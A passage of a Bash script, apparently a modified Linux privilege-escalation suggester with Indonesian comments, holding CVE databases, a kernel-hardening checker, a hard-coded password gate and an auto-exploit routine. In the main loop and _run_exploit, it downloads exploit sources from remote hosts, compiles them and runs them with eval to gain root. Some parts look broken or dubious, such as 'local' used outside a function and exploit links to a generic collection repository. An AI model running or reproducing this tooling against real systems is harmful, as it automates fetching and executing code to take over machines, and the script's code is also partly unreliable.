EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2022-32250]${txtrst} nft_object_UAF_NEWSET" "pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "ubuntu=(22.04)" "1" "analysis-url: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
src-url: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
author: theori.io")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2023-0386]${txtrst} OverlayFS_suid_smuggle" "pkg=linux-kernel,ver>=5.11,ver<=6.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "ubuntu=22.04.1" "1" "analysis-url: https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/
src-url: https://github.com/xkaneiki/CVE-2023-0386/archive/refs/heads/main.zip
author: xkaneiki")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2024-1086]${txtrst} double_free_nf_tables" "pkg=linux-kernel,x86_64,ver>=5.14,ver<=6.6,CONFIG_NF_TABLES=y,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "debian=12,ubuntu=22.04" "1" "analysis-url: https://pwning.tech/nftables/
src-url: https://github.com/Notselwyn/CVE-2024-1086/archive/refs/heads/main.zip
author: notselwyn")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2025-7771]${txtrst} linux_kernel_LPE_2025" "pkg=linux-kernel,ver>=6.1,ver<=6.8" "" "1" "src-url: https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2025-7771/exploit.c")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2026-31431]${txtrst} Copy_Fail_LPE" "pkg=linux-kernel,ver>=6.6,ver<=6.12" "" "1" "src-url: https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2026-31431/exploit.c")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2026-43500]${txtrst} Dirty_Frag_lutil_LPE" "pkg=linux-kernel,ver>=6.8,ver<=6.14" "" "1" "src-url: https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2026-43500/poc.c")

# ============================================================
# USERSPACE EXPLOITS DATABASE
# ============================================================
n=0

EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2004-0186]${txtrst} samba" "pkg=samba,ver<=2.2.8" "" "1" "exploit-db: 23674")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-1185]${txtrst} udev" "pkg=udev,ver<141" "ubuntu=8.10|9.04" "1" "exploit-db: 8572")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-1185]${txtrst} udev2" "pkg=udev,ver<141" "" "1" "exploit-db: 8478")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-0832]${txtrst} PAM_MOTD" "pkg=libpam-modules,ver<=1.1.1" "ubuntu=9.10|10.04" "1" "exploit-db: 14339")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-4170]${txtrst} SystemTap" "pkg=systemtap,ver<=1.3" "RHEL=5,fedora=13" "1" "exploit-db: 15620")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2011-1485]${txtrst} pkexec" "pkg=polkit,ver=0.96" "RHEL=6,ubuntu=10.04|10.10" "1" "exploit-db: 17942")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2012-0809]${txtrst} death_star_sudo" "pkg=sudo,ver>=1.8.0,ver<=1.8.3" "fedora=16" "1" "analysis-url: http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt
exploit-db: 18436")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-0476]${txtrst} chkrootkit" "pkg=chkrootkit,ver<0.50" "" "1" "analysis-url: http://seclists.org/oss-sec/2014/q2/430
exploit-db: 33899")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-5119]${txtrst} gconv_translit_find" "pkg=glibc|libc6,x86" "debian=6" "1" "analysis-url: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
exploit-db: 34421")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2015-1862]${txtrst} newpid_abrt" "pkg=abrt" "fedora=20" "1" "analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
exploit-db: 36746")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2015-3202]${txtrst} fuse_fusermount" "pkg=fuse,ver<2.9.3" "debian=7.0|8.0,ubuntu=*" "1" "analysis-url: http://seclists.org/oss-sec/2015/q2/520
exploit-db: 37089")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2019-18634]${txtrst} sudo_pwfeedback" "pkg=sudo,ver<1.8.31" "mint=19" "1" "analysis-url: https://dylankatz.com/Analysis-of-CVE-2019-18634/
src-url: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
author: saleemrashid")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2021-3156]${txtrst} sudo_Baron_Samedit" "pkg=sudo,ver<1.9.5p2" "mint=19,ubuntu=18|20,debian=10" "1" "analysis-url: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
src-url: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
author: blasty")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2017-5618]${txtrst} setuid_screen_4.5.0" "pkg=screen,ver==4.5.0" "" "1" "analysis-url: https://seclists.org/oss-sec/2017/q1/184
exploit-db: 41154")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2021-4034]${txtrst} PwnKit" "pkg=polkit|policykit-1,ver<=0.105-31" "ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro" "1" "analysis-url: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
src-url: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
author: berdav")
EXPLOITS_USERSPACE[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2025-32463]${txtrst} sudo_chwoot" "pkg=sudo,ver>=1.9.14,ver<=1.9.17" "ubuntu=24.04.1,fedora=41" "1" "analysis-url: https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/
src-url: https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/archive/refs/heads/main.zip
author: Rich Mirch")

# ============================================================
# FEATURES DATABASE
# ============================================================
n=0

FEATURES[((n++))]="section: Mainline kernel protection mechanisms:"
FEATURES[((n++))]="feature: Kernel Page Table Isolation (PTI) support$$available: ver>=4.15$$enabled: cmd:grep -Eqi '\\spti' /proc/cpuinfo$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/pti.md"
FEATURES[((n++))]="feature: GCC stack protector support$$available: CONFIG_HAVE_STACKPROTECTOR=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-regular.md"
FEATURES[((n++))]="feature: GCC stack protector STRONG support$$available: CONFIG_STACKPROTECTOR_STRONG=y,ver>=3.14$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-strong.md"
FEATURES[((n++))]="feature: Low address space protection (mmap_min_addr)$$available: CONFIG_DEFAULT_MMAP_MIN_ADDR=[0-9]+$$enabled: sysctl:vm.mmap_min_addr!=0$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/mmap_min_addr.md"
FEATURES[((n++))]="feature: YAMA ptrace scope restriction$$available: CONFIG_SECURITY_YAMA=y$$enabled: sysctl:kernel.yama.ptrace_scope!=0$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/yama_ptrace_scope.md"
FEATURES[((n++))]="feature: dmesg restrict (syslog protection)$$available: CONFIG_SECURITY_DMESG_RESTRICT=y,ver>=2.6.37$$enabled: sysctl:kernel.dmesg_restrict!=0$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/dmesg_restrict.md"
FEATURES[((n++))]="feature: KASLR (kernel address space layout randomization)$$available: CONFIG_RANDOMIZE_BASE=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/kaslr.md"
FEATURES[((n++))]="feature: Hardened user copy support$$available: CONFIG_HARDENED_USERCOPY=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/hardened_usercopy.md"
FEATURES[((n++))]="feature: Strict kernel RWX (text+rodata read-only)$$available: CONFIG_STRICT_KERNEL_RWX=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_kernel_rwx.md"
FEATURES[((n++))]="feature: Strict module RWX (module data NX, text RO)$$available: CONFIG_STRICT_MODULE_RWX=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_module_rwx.md"
FEATURES[((n++))]="feature: Stack protector strong$$available: CONFIG_STACKPROTECTOR_STRONG=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-strong.md"
FEATURES[((n++))]="feature: Freelist random$$available: CONFIG_SLAB_FREELIST_RANDOM=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_random.md"
FEATURES[((n++))]="feature: Freelist hardened$$available: CONFIG_SLAB_FREELIST_HARDENED=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_hardened.md"
FEATURES[((n++))]="feature: VMAP stack (virtually-mapped kernel stacks)$$available: CONFIG_VMAP_STACK=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/vmap_stack.md"
FEATURES[((n++))]="feature: Page poisoning$$available: CONFIG_PAGE_POISONING=y$$enabled: cmd:grep 'page_poison=1' /proc/cmdline$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/page_poisoning.md"
FEATURES[((n++))]="feature: FORTIFY_SOURCE (hardening str/mem functions)$$available: CONFIG_FORTIFY_SOURCE=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/fortify_source.md"
FEATURES[((n++))]="feature: Strict /dev/mem access$$available: CONFIG_STRICT_DEVMEM=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_devmem.md"
FEATURES[((n++))]="feature: Strict I/O /dev/mem access$$available: CONFIG_IO_STRICT_DEVMEM=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/io_strict_devmem.md"
FEATURES[((n++))]="section: Hardware-based protection features:"
FEATURES[((n++))]="feature: SMEP (Supervisor Mode Execution Prevention)$$available: ver>=3.0$$enabled: cmd:grep -qi smep /proc/cpuinfo$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/smep.md"
FEATURES[((n++))]="feature: SMAP (Supervisor Mode Access Prevention)$$available: ver>=3.7$$enabled: cmd:grep -qi smap /proc/cpuinfo$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/smap.md"
FEATURES[((n++))]="section: 3rd party kernel protection mechanisms:"
FEATURES[((n++))]="feature: Grsecurity$$available: CONFIG_GRKERNSEC=y$$enabled: cmd:test -c /dev/grsec"
FEATURES[((n++))]="feature: PaX$$available: CONFIG_PAX=y$$enabled: cmd:test -x /sbin/paxctl"
FEATURES[((n++))]="feature: LKRG (Linux Kernel Runtime Guard)$$enabled: cmd:test -d /proc/sys/lkrg$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/lkrg.md"
FEATURES[((n++))]="section: Attack Surface:"
FEATURES[((n++))]="feature: User namespaces for unprivileged accounts$$available: CONFIG_USER_NS=y$$enabled: sysctl:kernel.unprivileged_userns_clone==1$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/user_ns.md"
FEATURES[((n++))]="feature: Unprivileged bpf() syscall access$$available: CONFIG_BPF_SYSCALL=y$$enabled: sysctl:kernel.unprivileged_bpf_disabled!=1$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md"
FEATURES[((n++))]="feature: Seccomp filtering$$available: CONFIG_SECCOMP=y$$enabled: cmd:grep -iw Seccomp /proc/self/status | awk '{print \$2}'$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md"
FEATURES[((n++))]="feature: /dev/mem support$$available: CONFIG_DEVMEM=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/devmem.md"
FEATURES[((n++))]="feature: /dev/kmem support$$available: CONFIG_DEVKMEM=y$$analysis-url: https://github.com/mzet-/les-res/blob/master/features/devkmem.md"

# ============================================================
# FUNCTIONS
# ============================================================

version() { echo "linux-vuln-detector $VERSION"; }

usage() {
    echo "linux-vuln-detector $VERSION"
    echo
    echo "Usage: check.sh [OPTIONS]"
    echo
    echo " -V | --version               - print version"
    echo " -h | --help                  - print this help"
    echo " -k | --kernel <version>      - provide kernel version"
    echo " -u | --uname <string>        - provide 'uname -a' string"
    echo " --skip-more-checks           - skip additional checks (kernel config, sysctl)"
    echo " --skip-pkg-versions          - skip exact userspace package version check"
    echo " -p | --pkglist-file <file>   - provide file with 'dpkg'"
    # ============================================================
# FUNCTIONS (lanjutan)
# ============================================================

exitWithErrMsg() { echo "$1" 1>&2; exit 1; }

parseUname() {
    local uname=$1
    KERNEL=$(echo "$uname" | awk '{print $3}' | cut -d '-' -f 1)
    KERNEL_ALL=$(echo "$uname" | awk '{print $3}')
    ARCH=$(echo "$uname" | awk '{print $(NF-1)}')
    OS=""
    echo "$uname" | grep -q -i 'deb' && OS="debian"
    echo "$uname" | grep -q -i 'ubuntu' && OS="ubuntu"
    echo "$uname" | grep -q -i '\-ARCH' && OS="arch"
    echo "$uname" | grep -q -i '\.fc' && OS="fedora"
    echo "$uname" | grep -q -i '\.el' && OS="RHEL"
    if [ -z "$OS" ]; then
        local osrel=$(grep -s '^ID=' /etc/os-release 2>/dev/null | cut -d'=' -f2 | tr -d '"' | tr '[:upper:]' '[:lower:]')
        [ -n "$osrel" ] && OS="$osrel"
    fi
}

detectDistro() {
    local ver=""
    ver=$(grep -s '^VERSION_ID=' /etc/os-release 2>/dev/null | cut -d'=' -f2 | tr -d '"')
    [ -z "$ver" ] && ver=$(grep -s '^DISTRIB_RELEASE=' /etc/lsb-release 2>/dev/null | cut -d'=' -f2 | tr -d '"')
    [ -z "$ver" ] && ver=$(cat /etc/debian_version 2>/dev/null | head -1)
    echo "$ver"
}

getPkgList() {
    local distro=$1
    local pkglist_file=$2
    if [ "$opt_pkglist_file" = "true" -a -e "$pkglist_file" ]; then
        if head -1 "$pkglist_file" | grep -q 'Desired=Unknown'; then
            PKG_LIST=$(awk '{print $2"-"$3}' "$pkglist_file" | sed 's/:amd64//g')
            OS="debian"
            grep -q ubuntu "$pkglist_file" && OS="ubuntu"
        elif grep -qE '\.el[1-9]' "$pkglist_file"; then
            PKG_LIST=$(cat "$pkglist_file"); OS="RHEL"
        elif grep -qE '\.fc[1-9]' "$pkglist_file"; then
            PKG_LIST=$(cat "$pkglist_file"); OS="fedora"
        elif [ -x /usr/bin/pacman ]; then
            PKG_LIST=$(pacman -Q 2>/dev/null | awk '{print $1"-"$2}')
        fi
    elif [ "$distro" = "debian" -o "$distro" = "ubuntu" ]; then
        PKG_LIST=$(dpkg -l 2>/dev/null | awk '{print $2"-"$3}' | sed 's/:amd64//g')
    elif [ "$distro" = "RHEL" -o "$distro" = "fedora" ]; then
        PKG_LIST=$(rpm -qa 2>/dev/null)
    elif [ "$distro" = "arch" -o "$distro" = "manjaro" ]; then
        PKG_LIST=$(pacman -Q 2>/dev/null | awk '{print $1"-"$2}')
    else
        PKG_LIST=""
    fi
}

verComparision() {
    if [[ $1 == $2 ]]; then return 0; fi
    local IFS=.
    local i ver1=($1) ver2=($2)
    for ((i=${#ver1[@]}; i<${#ver2[@]}; i++)); do ver1[i]=0; done
    for ((i=0; i<${#ver1[@]}; i++)); do
        [[ -z ${ver2[i]} ]] && ver2[i]=0
        ((10#${ver1[i]} > 10#${ver2[i]})) && return 1
        ((10#${ver1[i]} < 10#${ver2[i]})) && return 2
    done
    return 0
}

doVersionComparision() {
    local reqVersion="$1" reqRelation="$2" currentVersion="$3"
    verComparision "$currentVersion" "$reqVersion"
    case $? in
        0) currentRelation='=';; 1) currentRelation='>';; 2) currentRelation='<';;
    esac
    case "$reqRelation" in
        "=")  [ "$currentRelation" = "=" ] && return 0;;
        ">")  [ "$currentRelation" = ">" ] && return 0;;
        "<")  [ "$currentRelation" = "<" ] && return 0;;
        ">=") [ "$currentRelation" = "=" -o "$currentRelation" = ">" ] && return 0;;
        "<=") [ "$currentRelation" = "=" -o "$currentRelation" = "<" ] && return 0;;
    esac
    return 1
}

checkRequirement() {
    local IN="$1" pkgName="${2:4}"
    if [[ "$IN" =~ ^pkg=.*$ ]]; then
        [ "$pkgName" = "linux-kernel" ] && return 0
        echo "$PKG_LIST" | grep -qiE "^$pkgName-[0-9]+" && return 0
    elif [[ "$IN" =~ ^ver.*$ ]]; then
        local rest="${IN#ver}"
        local operator=$(echo "$rest" | grep -oE '^[<>=]+')
        local version=$(echo "$rest" | sed "s/^[<>=]*//; s/-.*$//; s/[^0-9.]//g")
        if [ "$pkgName" = "linux-kernel" ]; then
            doVersionComparision "$version" "$operator" "$KERNEL" && return 0
        elif [ -n "$PKG_LIST" ]; then
            local pkg=$(echo "$PKG_LIST" | grep -iE "^$pkgName-[0-9]+" | head -1)
            [ "$opt_skip_pkg_versions" = "true" -a -n "$pkg" ] && return 0
            local pkgVer=$(echo "$pkg" | grep -oE '-[0-9]+\.[0-9]+[^-\+]*' | tr -d '-')
            [ -z "$pkgVer" ] && pkgVer=$(echo "$pkg" | grep -oE '[0-9]+\.[0-9]+[^-\+]*' | head -1)
            [ -n "$pkgVer" ] && doVersionComparision "$version" "$operator" "$pkgVer" && return 0
        fi
    elif [[ "$IN" =~ ^x86_64$ ]] && [ "$ARCH" = "x86_64" -o -z "$ARCH" ]; then return 0
    elif [[ "$IN" =~ ^x86$ ]] && [[ "$ARCH" =~ ^i[3-6]86$ || -z "$ARCH" ]]; then return 0
    elif [[ "$IN" =~ ^CONFIG_ ]]; then
        [ "$opt_skip_more_checks" = "true" ] && return 0
        [ -z "$KCONFIG" ] && return 0
        $KCONFIG 2>/dev/null | grep -qiE "$IN" && return 0 || return 1
    elif [[ "$IN" =~ ^sysctl: ]]; then
        [ "$opt_skip_more_checks" = "true" ] && return 0
        local sc="${IN:7}"
        local sign="==" val="" entry=""
        echo "$sc" | grep -qi "!=" && sign="!=" || sign="=="
        val=$(echo "$sc" | awk -F "$sign" '{print $2}' | tr -d ' ')
        entry=$(echo "$sc" | awk -F "$sign" '{print $1}' | tr -d ' ')
        local curVal=$(/sbin/sysctl -n "$entry" 2>/dev/null | tr -d ' ')
        [ -z "$curVal" ] && return 0
        [ "$sign" = "==" -a "$curVal" = "$val" ] && return 0
        [ "$sign" = "!=" -a "$curVal" != "$val" ] && return 0
    elif [[ "$IN" =~ ^cmd: ]]; then
        [ "$opt_skip_more_checks" = "true" ] && return 0
        eval "${IN:4}" 2>/dev/null && return 0
    fi
    return 1
}

getKernelConfig() {
    [ -f /proc/config.gz ] && KCONFIG="zcat /proc/config.gz" && return
    local kver=$(uname -r)
    [ -f "/boot/config-$kver" ] && KCONFIG="cat /boot/config-$kver" && return
    [ -f /usr/src/linux/.config ] && KCONFIG="cat /usr/src/linux/.config" && return
    KCONFIG=""
}

_download() {
    local url="$1" out="$2"
    if command -v wget &>/dev/null; then
        wget -q --timeout=15 "$url" -O "$out" 2>/dev/null && [ -s "$out" ] && return 0
    fi
    if command -v curl &>/dev/null; then
        curl -fsSL --connect-timeout 15 "$url" -o "$out" 2>/dev/null && [ -s "$out" ] && return 0
    fi
    return 1
}

_check_root() { [ "$(id -u)" = "0" ]; }

_run_exploit() {
    local cve="$1" url="$2" src="$3" compile="$4" run="$5"
    [ "$(uname -s)" != "Linux" ] && return 1
    $_check_root && { _ROOT_ACHIEVED=true; return 0; }

    echo -e "  --> trying $cve ..."
    _download "$url" "$src" || { echo -e "      download failed"; return 1; }
    [ ! -s "$src" ] && { echo -e "      file empty"; rm -f "$src"; return 1; }

    # Cek apakah shell script
    if head -c 200 "$src" | grep -qE '#!/bin/(bash|sh)'; then
        chmod +x "$src"
        echo -e "      running shell script..."
        bash "./$src" 2>&1 | head -5
        $_check_root && { _ROOT_ACHIEVED=true; echo -e "  ${txtgrn}[ROOT]${txtrst} $cve succeeded!"; return 0; }
        return 1
    fi

    echo -e "      compiling..."
    local out
    out=$(eval "$compile" 2>&1)
    if [ $? -ne 0 ]; then
        echo -e "      compile failed"
        echo "$out" | head -5 | sed 's/^/        /'
        rm -f "$src"
        return 1
    fi

    echo -e "      executing..."
    eval "$run" 2>&1 | head -10
    $_check_root && { _ROOT_ACHIEVED=true; echo -e "  ${txtgrn}[ROOT]${txtrst} $cve succeeded!"; return 0; }
    echo -e "      $cve did not yield root"
    return 1
}

# ============================================================
# BANNER & PASSWORD
# ============================================================

show_banner() {
    local c2=$'\033[38;5;196m' c3=$'\033[38;5;88m' rst=$'\033[0m'
    local bold=$'\033[1m' dim=$'\033[38;5;240m'
    clear 2>/dev/null
    echo
    echo -e "${c2}  Linux Vulnerability Detector v$VERSION${txtrst}"
    echo -e "${dim}  Linux PE Vulnerability Scanner & Auto-Exploit${txtrst}"
}

check_password() {
    local c2=$'\033[38;5;196m' bold=$'\033[1m' dim=$'\033[38;5;240m' rst=$'\033[0m'
    echo
    printf "${c2}${bold} enter password${rst}\n"
    printf "${dim}  > ${rst}"
    read -rs password
    echo
    if [ "$password" != "1996groovyreborn" ]; then
        printf "${c2}${bold} access denied${rst}\n"
        exit 1
    fi
    echo
}

# ============================================================
# FEATURE CHECK MODE
# ============================================================

checksecMode() {
    local MODE=0
    for FEATURE in "${FEATURES[@]}"; do
        # Parse with $$ delimiter
        local name="${FEATURE%%$$*}"
        local rest="${FEATURE#*$$}"
        local avail="${rest%%$$*}"
        rest="${rest#*$$}"
        local en="${rest%%$$*}"
        rest="${rest#*$$}"
        local aurl="$rest"

        # Hapus prefix "feature: " dan "section: "
        if echo "$name" | grep -q "^section:"; then
            MODE=$((MODE+1))
            echo
            echo -e "${bldwht}${name#section: }${txtrst}"
            echo
            continue
        fi
        local fname="${name#feature: }"

        local unknown="[ ${txtgray}Unknown${txtrst}  ]"
        local enabled="[ ${txtgrn}Enabled${txtrst}  ]"
        local disabled="[ ${txtred}Disabled${txtrst} ]"
        [ $MODE -eq 4 ] && enabled="[ ${txtred}Exposed${txtrst}  ]" && disabled="[ ${txtgrn}Locked${txtrst}   ]"

        # Check available
        local aOK=true
        IFS=',' read -ra areqs <<< "$avail"
        for r in "${areqs[@]}"; do
            checkRequirement "$r" || { aOK=false; break; }
        done

        # Check enabled
        local eOK=true
        [ -n "$en" ] && IFS=',' read -ra ereqs <<< "$en"
        for r in "${ereqs[@]}"; do
            checkRequirement "$r" || { eOK=false; break; }
        done

        local state="$unknown"
        [ -z "$KCONFIG" -a -z "$en" ] && state="$unknown"
        [ "$aOK" = true -a "$eOK" = true ] && state="$enabled"
        [ "$aOK" = true -a "$eOK" = false ] && state="$disabled"

        echo -e " $state $fname"
        [ -n "$aurl" ] && echo -e "        $aurl"
        echo
    done
}

# ============================================================
# MAIN
# ============================================================

# Parse args
while [ "$#" -gt 0 ]; do
    case "$1" in
        -u|--uname) shift; UNAME_A="$1"; opt_uname_string=true ;;
        -V|--version) version; exit 0 ;;
        -h|--help) usage; exit 0 ;;
        -f|--full) opt_full=true ;;
        -g|--short) opt_summary=true ;;
        -b|--fetch-binaries) opt_fetch_bins=true ;;
        -s|--fetch-sources) opt_fetch_srcs=true ;;
        -e|--auto-exploit) opt_auto_exploit=true ;;
        -k|--kernel) shift; KERNEL="$1"; opt_kernel_version=true ;;
        -d|--show-dos) opt_show_dos=true ;;
        -p|--pkglist-file) shift; PKGLIST_FILE="$1"; opt_pkglist_file=true ;;
        --cvelist-file) shift; CVELIST_FILE="$1"; opt_cvelist_file=true ;;
        --checksec) opt_checksec_mode=true ;;
        --kernelspace-only) opt_kernel_only=true ;;
        --userspace-only) opt_userspace_only=true ;;
        --skip-more-checks) opt_skip_more_checks=true ;;
        --skip-pkg-versions) opt_skip_pkg_versions=true ;;
        --) shift; break ;;
        -*) exitWithErrMsg "Unknown option '$1'." ;;
        *) break ;;
    esac
    shift
done

# Validasi
[ "$opt_kernel_version" = true -a "$opt_uname_string" = true ] && exitWithErrMsg "-u dan -k tidak bisa dipakai bersamaan."
[ "$opt_full" = true -a "$opt_summary" = true ] && exitWithErrMsg "-f dan -g tidak bisa dipakai bersamaan."

# Show banner + password
show_banner
check_password

# Setup target info
if [ "$opt_checksec_mode" = true ]; then
    opt_skip_more_checks=false
    getKernelConfig
    [ -z "$KCONFIG" ] && echo "WARNING: Kernel config tidak ditemukan."
    checksecMode
    exit 0
fi

if [ "$opt_kernel_version" = true ]; then
    [ -z "$KERNEL" ] && exitWithErrMsg "Kernel version tidak valid."
    ARCH=""; OS=""; opt_skip_more_checks=true
    getPkgList "" "$PKGLIST_FILE"
elif [ "$opt_uname_string" = true ]; then
    [ -z "$UNAME_A" ] && exitWithErrMsg "uname string kosong."
    parseUname "$UNAME_A"; opt_skip_more_checks=true
    getPkgList "" "$PKGLIST_FILE"
else
    KERNEL=$(uname -r | cut -d'-' -f1)
    KERNEL_ALL=$(uname -r)
    ARCH=$(uname -m)
    parseUname "$(uname -a)"
    [ "$opt_skip_more_checks" = false ] && getKernelConfig
    DISTRO=$(detectDistro)
    [ -z "$OS" ] && OS=$(grep -s '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"')
    getPkgList "$OS" ""
fi

echo
echo -e "${bldwht}[ Target Info ]${txtrst}"
echo -e "  Kernel  : ${txtgrn}${KERNEL}${txtrst}"
echo -e "  Arch    : ${txtgrn}${ARCH}${txtrst}"
echo -e "  Distro  : ${txtgrn}${OS} ${DISTRO}${txtrst}"
echo

[ "$opt_kernel_only" = true -o -z "$PKG_LIST" ] && { unset EXPLOITS_USERSPACE; declare -a EXPLOITS_USERSPACE; }
[ "$opt_userspace_only" = true ] && { unset EXPLOITS; declare -a EXPLOITS; }

echo -e "${bldwht}[ Detected Vulnerable CVEs ]${txtrst}"
echo

# Scan for vulnerabilities
j=0
for EXP in "${EXPLOITS[@]}" "${EXPLOITS_USERSPACE[@]}"; do
    NAME=$(echo "$EXP" | grep "^Name:" | cut -d' ' -f2-)
    REQS=$(echo "$EXP" | grep "^Reqs:" | cut -d' ' -f2-)
    TAGS=$(echo "$EXP" | grep "^Tags:" | cut -d' ' -f2-)
    RANK=$(echo "$EXP" | grep "^Rank:" | cut -d' ' -f2)

    # Parse requirements
    IFS=',' read -ra array <<< "$REQS"
    local PASSED=0
    for REQ in "${array[@]}"; do
        checkRequirement "$REQ" "${array[0]}" && PASSED=$((PASSED+1)) || break
    done

    [ $PASSED -eq ${#array[@]} ] || continue

    # Skip DoS unless asked
    local is_dos=$(echo "$EXP" | grep -io "(dos")
    [ "$opt_show_dos" = false -a -n "$is_dos" ] && continue

    echo -e "  ${txtred}[VULNERABLE]${txtrst}  $NAME"

    # ---- AUTO EXPLOIT ----
    [ "$_ROOT_ACHIEVED" = true ] && continue
    [ "$opt_auto_exploit" != true ] && continue

    # Polkit
    echo "$NAME" | grep -q "CVE-2021-4034" && _run_exploit "CVE-2021-4034 (PwnKit)" \
        "https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/CVE-2021-4034.c" \
        "pwnkit.c" "gcc pwnkit.c -o pwnkit" "./pwnkit"

    # DirtyPipe
    echo "$NAME" | grep -q "CVE-2022-0847" && _run_exploit "CVE-2022-0847 (DirtyPipe)" \
        "https://haxx.in/files/dirtypipez.c" \
        "dirtypipe.c" "gcc dirtypipe.c -o dirtypipe -lpthread" "./dirtypipe"

    # DirtyCow
    echo "$NAME" | grep -q "CVE-2016-5195" && _run_exploit "CVE-2016-5195 (DirtyCow)" \
        "https://www.exploit-db.com/download/40839" \
        "dirtycow.c" "gcc -pthread dirtycow.c -o dirtycow -lcrypt" "./dirtycow"

    # eBPF
    echo "$NAME" | grep -q "CVE-2017-16995" && _run_exploit "CVE-2017-16995 (eBPF)" \
        "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-16995/exploit.c" \
        "cve16995.c" "gcc cve16995.c -o cve16995" "./cve16995"

    # PTRACE_TRACEME
    echo "$NAME" | grep -q "CVE-2019-13272" && _run_exploit "CVE-2019-13272 (PTRACE)" \
        "https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c" \
        "pt13272.c" "gcc pt13272.c -o pt13272 -std=gnu99" "./pt13272"

    # OverlayFS
    echo "$NAME" | grep -q "CVE-2021-3493" && _run_exploit "CVE-2021-3493 (OverlayFS)" \
        "https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c" \
        "cve3493.c" "gcc cve3493.c -o cve3493" "./cve3493"

    # Baron Samedit
    echo "$NAME" | grep -q "CVE-2021-3156" && _run_exploit "CVE-2021-3156 (Baron Samedit)" \
        "https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit.c" \
        "baron.c" "gcc baron.c -o baron -lutil" "./baron"

    # CVE-2025-7771
    echo "$NAME" | grep -q "CVE-2025-7771" && _run_exploit "CVE-2025-7771" \
